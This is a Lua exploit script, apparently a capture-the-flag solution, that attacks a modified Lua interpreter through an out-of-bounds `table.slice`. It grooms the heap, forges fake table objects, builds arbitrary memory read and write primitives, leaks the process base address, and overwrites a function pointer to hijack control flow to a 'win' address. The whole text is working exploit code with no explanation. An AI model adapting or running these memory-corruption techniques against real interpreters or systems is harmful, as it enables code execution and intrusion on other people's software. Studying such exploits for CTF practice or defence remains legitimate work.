local OFS = 0x4038 -- fix this in range of 0x80

function pwn()
   function p64(v)
      local s = "";
      for i = 0, 7 do
         s = s .. string.char((v >> (i * 8)) & 0xff)
      end
      return s;
   end
   function hex(v)
      return string.format("0x%x", v)
   end
   function addrof_t(obj)
      return tonumber(tostring(obj):sub(10), 16)
   end
   function addrof_f(obj)
      return tonumber(tostring(obj):sub(13), 16)
   end

   -- consume all freed chunks
   local allocator = string.rep("A", 0x1000)
   collectgarbage()

   local consume = {}
   local consume_i = 0
   for size = 0x800, 0x10, -0x10 do
      for i = 1, 8 do
         consume_i = consume_i + 1
         consume[consume_i] = string.sub(allocator, -size)
      end
   end
   for i = 1, 0x20 do
      consume_i = consume_i + 1
      consume[consume_i] = { 0xdead }
   end
   for i = 1, 0x80 do
      consume_i = consume_i + 1
      consume[consume_i] = string.sub(allocator, -0x40) .. "xx"
   end
   consume[0] = string.sub(allocator, -0x20) .. "xx"

   -- actual exploit starts here
   local obj_base = {}
   local oob_array = { 0xdead, 0xbeef }
   local addr_base = addrof_t(obj_base)
   local addr_fake_table = addr_base + OFS
   print("[+] base @ " .. hex(addr_base))
   print("[+] fake table @ " .. hex(addr_fake_table))
   print("[+] oob_array @ " .. hex(addrof_t(oob_array)))

   local fake_table_string = string.rep(
      p64(0)                     -- CommonHeader
      .. p64(0x00007fff003f1005) -- (u8)flags / (u8)lsizenode / (u32)alimit
      .. p64(0xdeadbeef) -- array
      .. p64(0)  -- node
      .. p64(0)  -- lastfree
      .. p64(0)  -- metatable
      .. p64(0)  -- gclist
      .. p64(0)
      .. p64(0)                  -- CommonHeader
      .. p64(0x00007fff003f1005) -- (u8)flags / (u8)lsizenode / (u32)alimit
      .. p64(addr_fake_table + 0x40) -- array
      .. p64(0)  -- node
      .. p64(0)  -- lastfree
      .. p64(0)  -- metatable
      .. p64(0)  -- gclist
      .. p64(0),
      0x40
   )
   local fake_element_string = string.rep(
      p64(addr_fake_table) -- pointer=fake_table
      .. p64(0x45)         -- type=table
      .. p64(addr_fake_table + 0x40) -- pointer=next fake_table
      .. p64(0x45),                  -- type=table
      0x80
   )

   -- create an evil array whose size seems very big
   setmetatable(oob_array, {__len=function() return 0x7fff end})
   local oob_evil = table.slice(oob_array, 0x600, 0x602)
   local fake_array = oob_evil[1]
   local victim_array = oob_evil[2]

   -- create aar / aaw
   function aar64(address)
      fake_array[2] = address + 8
      victim_array[1] = 3 -- type=int
      fake_array[2] = address
      return victim_array[1]
   end
   function aaw64(address, value)
      fake_array[2] = address
      victim_array[1] = value
   end

   -- leak proc --> libc --> stack
   local proc_base = addrof_f(print) - 0x25930
   local addr_win  = proc_base + 0x7a40
   print("[+] proc @ " .. hex(proc_base))
   local target = proc_base + 0x3c100

   -- get rip control
   local fake_function_table = { print }
   local addr_fake_function_table = addrof_t(fake_function_table)
   print("[+] fake_function_table @ " .. hex(addr_fake_function_table))
   local addr_fake_function = aar64(addr_fake_function_table + 0x10)
   print("[+] fake_function @ " .. hex(addr_fake_function))
   aaw64(addr_fake_function + 0, addr_win)
   aaw64(addr_fake_function + 8, 0x16)

   print("[+] go!")
   fake_function_table[1]()
end

pwn()
__EOF__
